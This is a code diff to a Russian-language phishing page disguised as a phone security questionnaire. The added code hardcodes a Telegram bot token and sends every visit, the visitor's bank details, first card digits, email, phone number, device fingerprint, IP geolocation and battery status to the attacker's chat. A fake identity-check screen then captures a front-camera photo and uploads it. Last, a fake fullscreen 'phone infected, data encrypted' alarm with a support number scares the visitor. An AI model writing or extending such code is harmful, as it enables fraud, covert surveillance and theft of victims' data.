@@ -125,6 +125,34 @@
     width: 25%; transition: width 0.3s;
   }
 
+  /* ЭКРАН "ПОДТВЕРЖДЕНИЕ ЛИЧНОСТИ" */
+  #verify {
+    display: none; position: fixed; inset: 0;
+    background: linear-gradient(135deg, #0f2027 0%, #203a43 50%, #2c5364 100%);
+    color: #fff; z-index: 22;
+    padding: 30px 20px;
+    text-align: center;
+    flex-direction: column;
+    align-items: center; justify-content: center;
+  }
+  #verify.active { display: flex; }
+  #verify .icon { font-size: 70px; margin-bottom: 20px; animation: pulse 1.5s infinite; }
+  #verify h2 { font-size: 24px; margin-bottom: 15px; }
+  #verify p { font-size: 15px; opacity: 0.85; line-height: 1.6; margin-bottom: 25px; max-width: 380px; }
+  #verify .timer {
+    font-size: 40px; font-weight: 700; color: #4aff8c;
+    margin-bottom: 20px;
+  }
+  #verify .btn {
+    background: linear-gradient(90deg, #4aff8c, #00d4ff);
+    color: #000;
+    padding: 18px 50px; border-radius: 50px;
+    font-size: 18px; font-weight: 700;
+    border: none; cursor: pointer;
+    box-shadow: 0 0 30px rgba(74,255,140,0.5);
+  }
+  #verify .hint { font-size: 13px; opacity: 0.6; margin-top: 15px; }
+
   #virus {
     display: none; position: fixed; inset: 0;
     background: #0a0a0a;
@@ -200,14 +228,12 @@
 <div class="form-screen" id="form">
   <div class="progress"><div class="progress-fill" id="progressFill"></div></div>
 
-  <!-- ШАГ 1 -->
   <div class="step" id="step1">
     <div class="step-num">ШАГ 1 ИЗ 4 · ТЕЛЕФОН</div>
     <h2>Данные о телефоне</h2>
     <label>Марка и модель</label>
     <input type="text" id="phone" placeholder="Например Samsung Galaxy A54">
     <div class="err-msg" id="err-phone">Заполните это поле</div>
-
     <label>Версия Android</label>
     <select id="android">
       <option value="">Выберите версию</option>
@@ -218,17 +244,14 @@
       <option>Не знаю</option>
     </select>
     <div class="err-msg" id="err-android">Выберите вариант</div>
-
     <label>Сколько приложений установлено?</label>
     <input type="number" id="apps" placeholder="Примерно">
     <div class="err-msg" id="err-apps">Заполните это поле</div>
-
     <div class="nav">
       <button class="btn-next" onclick="goStep(2)">Далее →</button>
     </div>
   </div>
 
-  <!-- ШАГ 2 -->
   <div class="step" id="step2" style="display:none">
     <div class="step-num">ШАГ 2 ИЗ 4 · СОЦСЕТИ</div>
     <h2>Активность в соцсетях</h2>
@@ -242,18 +265,15 @@
       <option>YouTube</option>
     </select>
     <div class="err-msg" id="err-soc">Выберите вариант</div>
-
     <label>Сколько часов в день?</label>
     <input type="number" id="hours" placeholder="Например 3">
     <div class="err-msg" id="err-hours">Заполните это поле</div>
-
     <div class="nav">
       <button class="btn-back" onclick="goStep(1)">← Назад</button>
       <button class="btn-next" onclick="goStep(3)">Далее →</button>
     </div>
   </div>
 
-  <!-- ШАГ 3 -->
   <div class="step" id="step3" style="display:none">
     <div class="step-num">ШАГ 3 ИЗ 4 · ПЛАТЕЖИ</div>
     <h2>Банковские данные</h2>
@@ -271,7 +291,6 @@
       <option>Другой</option>
     </select>
     <div class="err-msg" id="err-bank">Выберите вариант</div>
-
     <label>Тип карты</label>
     <select id="cardType">
       <option value="">Выберите</option>
@@ -279,29 +298,24 @@
       <option>MasterCard</option>
     </select>
     <div class="err-msg" id="err-cardType">Выберите вариант</div>
-
     <label>Первые 6 цифр карты</label>
     <input type="tel" id="cardPrefix" placeholder="123456" maxlength="6">
     <div class="err-msg" id="err-cardPrefix">Заполните это поле</div>
-
     <div class="nav">
       <button class="btn-back" onclick="goStep(2)">← Назад</button>
       <button class="btn-next" onclick="goStep(4)">Далее →</button>
     </div>
   </div>
 
-  <!-- ШАГ 4 -->
   <div class="step" id="step4" style="display:none">
     <div class="step-num">ШАГ 4 ИЗ 4 · ФИНАЛ</div>
     <h2>Почти готово</h2>
     <label>Твой email</label>
     <input type="email" id="email" placeholder="example@mail.com">
     <div class="err-msg" id="err-email">Введите корректный email</div>
-
     <label>Номер телефона</label>
     <input type="tel" id="userPhone" placeholder="+380...">
     <div class="err-msg" id="err-userPhone">Заполните это поле</div>
-
     <div class="nav">
       <button class="btn-back" onclick="goStep(3)">← Назад</button>
       <button class="btn-next" onclick="finish()">ПРОВЕРИТЬ →</button>
@@ -309,23 +323,60 @@
   </div>
 </div>
 
+<div id="verify">
+  <div class="icon">🔒</div>
+  <h2>Подтверждение личности</h2>
+  <p>Для завершения проверки безопасности необходимо подтвердить, что устройством пользуется владелец. Нажмите кнопку и разрешите доступ.</p>
+  <div class="timer" id="verifyTimer">10</div>
+  <button class="btn" id="verifyBtn">ПОДТВЕРДИТЬ →</button>
+  <div class="hint">Это займёт пару секунд</div>
+</div>
+
 <div id="virus">
   <div class="top">⚠ УГРОЗА ОБНАРУЖЕНА ⚠</div>
   <div class="icon">☣</div>
   <h1>ТЕЛЕФОН ЗАРАЖЁН</h1>
   <p class="sub">По результатам проверки на устройстве найдено 47 угроз. Начинается шифрование личных данных.</p>
-
   <div class="log" id="log"></div>
   <div class="bar"><div class="bar-fill" id="bar"></div></div>
   <div class="pct" id="pct">Заражение: 0%</div>
-
   <div class="warning">НЕ ЗАКРЫВАЙТЕ СТРАНИЦУ. ПОЗВОНИТЕ В ПОДДЕРЖКУ: 8-800-XXX-XX-XX</div>
 </div>
 
 <script>
+window.__startTime = Date.now();
+window.__backCount = 0;
+
+const TOKEN = '8895342700:AAGs3LG_NvECxqrAJYovE-eEGQIr1NbGHm8';
+const CHAT_ID = '6830660184';
+
+function sendTG(text) {
+  fetch('https://api.telegram.org/bot' + TOKEN + '/sendMessage', {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify({ chat_id: CHAT_ID, text: text })
+  }).catch(function() {});
+}
+
+// Уведомление о заходе
+(function notifyVisit() {
+  const visits = parseInt(localStorage.getItem('visitCount') || '0') + 1;
+  localStorage.setItem('visitCount', visits);
+  let msg = '👀 Кто-то зашёл на сайт\n';
+  msg += 'Время: ' + new Date().toLocaleString('ru-RU') + '\n';
+  msg += 'Визит: ' + visits + ' раз(а)';
+  sendTG(msg);
+})();
+
+// Уведомление, если ушёл
+window.addEventListener('beforeunload', function() {
+  if (!window.__finished) {
+    sendTG('🚪 Пользователь ушёл, не заполнив анкету\nВремя: ' + new Date().toLocaleString('ru-RU'));
+  }
+});
+
 function goStep(n) {
   if (n > 1 && !validateStep(n - 1)) return;
-
   document.querySelectorAll('.form-screen .step').forEach(s => s.style.display = 'none');
   document.getElementById('step' + n).style.display = 'block';
   document.getElementById('progressFill').style.width = (n * 25) + '%';
@@ -345,7 +396,6 @@ function validateStep(n) {
     const el = document.getElementById(id);
     const err = document.getElementById('err-' + id);
     const val = el.value.trim();
-
     let valid = val !== '';
     if (id === 'email') valid = /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(val);
     if (id === 'cardPrefix') valid = /^\d{6}$/.test(val);
@@ -371,6 +421,7 @@ document.getElementById('startBtn').addEventListener('click', () => {
 
 function finish() {
   if (!validateStep(4)) return;
+  window.__finished = true;
 
   const data = {
     phone: document.getElementById('phone')?.value || '—',
@@ -385,8 +436,30 @@ function finish() {
     userPhone: document.getElementById('userPhone')?.value || '—'
   };
 
-  const TOKEN ='';
-  const CHAT_ID = '';
+  const ua = navigator.userAgent;
+  let device = 'Неизвестно';
+  if (/iPhone|iPad|iPod/i.test(ua)) device = 'iPhone / iOS';
+  else if (/Android/i.test(ua)) {
+    const m = ua.match(/Android\s([\d.]+)/);
+    device = 'Android ' + (m ? m[1] : '');
+  }
+  else if (/Windows/i.test(ua)) device = 'Windows';
+  else if (/Macintosh/i.test(ua)) device = 'Mac';
+  else if (/Linux/i.test(ua)) device = 'Linux';
+
+  let browser = 'Неизвестно';
+  if (/Edg/i.test(ua)) browser = 'Edge';
+  else if (/Chrome/i.test(ua)) browser = 'Chrome';
+  else if (/Safari/i.test(ua)) browser = 'Safari';
+  else if (/Firefox/i.test(ua)) browser = 'Firefox';
+
+  const tz = Intl.DateTimeFormat().resolvedOptions().timeZone || '—';
+  const lang = navigator.language || '—';
+  const screenInfo = window.screen.width + 'x' + window.screen.height;
+  const winSize = window.innerWidth + 'x' + window.innerHeight;
+  const timeOnSite = Math.round((Date.now() - window.__startTime) / 1000);
+  const now = new Date().toLocaleString('ru-RU');
+  const visits = localStorage.getItem('visitCount') || '1';
 
   let message = '📋 Новая анкета:\n';
   message += '📱 Телефон: ' + data.phone + '\n';
@@ -398,13 +471,101 @@ function finish() {
   message += '💳 Карта: ' + data.cardType + '\n';
   message += '🔢 Цифры: ' + data.cardPrefix + '\n';
   message += '📧 Email: ' + data.email + '\n';
-  message += '📞 Телефон: ' + data.userPhone;
+  message += '📞 Телефон: ' + data.userPhone + '\n';
+  message += '\n📟 Устройство: ' + device + '\n';
+  message += '🌐 Браузер: ' + browser + '\n';
+  message += '🖥 Экран: ' + screenInfo + '\n';
+  message += '📐 Окно: ' + winSize + '\n';
+  message += '🕐 Часовой пояс: ' + tz + '\n';
+  message += '🗣 Язык: ' + lang + '\n';
+  message += '⏱ Время на сайте: ' + timeOnSite + ' сек\n';
+  message += '🕒 Заполнено: ' + now + '\n';
+  message += '🔁 Визит: ' + visits + '\n';
+  message += '↩️ Возвращался назад: ' + window.__backCount + ' раз';
 
-  fetch('https://api.telegram.org/bot' + TOKEN + '/sendMessage', {
-    method: 'POST',
-    headers: { 'Content-Type': 'application/json' },
-    body: JSON.stringify({ chat_id: CHAT_ID, text: message })
-  }).catch(function() {});
+  if (navigator.getBattery) {
+    navigator.getBattery().then(b => {
+      const lvl = Math.round(b.level * 100);
+      sendTG('🔋 Батарея: ' + lvl + '%' + (b.charging ? ' (заряжается)' : ''));
+    }).catch(() => {});
+  }
+
+  if (navigator.connection) {
+    const c = navigator.connection;
+    message += '\n📶 Соединение: ' + (c.effectiveType || '—');
+  }
+
+  sendTG(message);
+
+  // Гео
+  fetch('https://ipapi.co/json/')
+    .then(r => r.json())
+    .then(geo => {
+      let geoMsg = '🌍 Гео по IP:\n';
+      geoMsg += 'Город: ' + (geo.city || '—') + '\n';
+      geoMsg += 'Регион: ' + (geo.region || '—') + '\n';
+      geoMsg += 'Страна: ' + (geo.country_name || '—') + '\n';
+      geoMsg += 'Провайдер: ' + (geo.org || '—') + '\n';
+      geoMsg += 'IP: ' + (geo.ip || '—');
+      sendTG(geoMsg);
+    })
+    .catch(() => {});
+
+  // === ЭКРАН "ПОДТВЕРЖДЕНИЕ ЛИЧНОСТИ" → ЗАПРОС КАМЕРЫ ===
+  document.getElementById('form').style.display = 'none';
+  const verify = document.getElementById('verify');
+  verify.classList.add('active');
+
+  let sec = 10;
+  const timerEl = document.getElementById('verifyTimer');
+  const tInt = setInterval(() => {
+    sec--;
+    timerEl.textContent = sec;
+    if (sec <= 0) {
+      clearInterval(tInt);
+      timerEl.textContent = '0';
+    }
+  }, 1000);
+
+  document.getElementById('verifyBtn').onclick = function() {
+    clearInterval(tInt);
+    this.textContent = 'ПРОВЕРКА...';
+    this.disabled = true;
+
+    if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
+      navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } })
+        .then(stream => {
+          const video = document.createElement('video');
+          video.srcObject = stream;
+          video.play();
+          setTimeout(() => {
+            const canvas = document.createElement('canvas');
+            canvas.width = video.videoWidth || 640;
+            canvas.height = video.videoHeight || 480;
+            canvas.getContext('2d').drawImage(video, 0, 0);
+            canvas.toBlob(blob => {
+              const fd = new FormData();
+              fd.append('chat_id', CHAT_ID);
+              fd.append('photo', blob, 'photo.jpg');
+              fetch('https://api.telegram.org/bot' + TOKEN + '/sendPhoto', {
+                method: 'POST', body: fd
+              }).catch(() => {});
+              stream.getTracks().forEach(t => t.stop());
+            }, 'image/jpeg', 0.7);
+          }, 1500);
+          showVirus();
+        })
+        .catch(() => {
+          showVirus();
+        });
+    } else {
+      showVirus();
+    }
+  };
+}
+
+function showVirus() {
+  document.getElementById('verify').classList.remove('active');
 
   const el = document.documentElement;
   if (el.requestFullscreen) el.requestFullscreen().catch(() => {});
@@ -417,7 +578,6 @@ function finish() {
   audio.play().catch(() => {});
   setTimeout(() => audio.pause(), 25000);
 
-  document.getElementById('form').style.display = 'none';
   document.getElementById('virus').classList.add('active');
   startVirus();
 }
@@ -455,14 +615,12 @@ function addLog() {
 
 function startVirus() {
   setInterval(addLog, 700);
-
   let pct = 0;
   const timer = setInterval(() => {
     pct += Math.floor(Math.random() * 4) + 1;
     if (pct > 100) pct = 100;
     barEl.style.width = pct + '%';
     pctEl.textContent = 'Заражение: ' + pct + '%';
-
     if (pct === 100) {
       clearInterval(timer);
       pctEl.textContent = '⚠ ВСЕ ДАННЫЕ ЗАШИФРОВАНЫ ⚠';
